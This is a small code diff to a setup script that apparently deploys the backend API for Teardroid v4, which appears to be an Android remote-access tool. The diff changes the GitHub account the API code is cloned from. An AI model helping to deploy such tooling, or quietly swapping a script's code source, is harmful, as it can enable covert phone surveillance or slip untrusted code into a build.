@@ -44,7 +44,7 @@ def setup():
         deta_cli_path + " new --python " + deta_micro_name)
     print(Fore.GREEN + "cloning teardroid_api repo")
     run_without_output(
-        "git clone https://github.com/ScRiPt1337/Teardroidv4_api")
+        "git clone https://github.com/rainydays1337/Teardroidv4_api")
     print(Fore.GREEN + "Moving all the important files...")
     run_without_output(
         f"cp -r ./Teardroidv4_api/* ./{deta_micro_name}/")
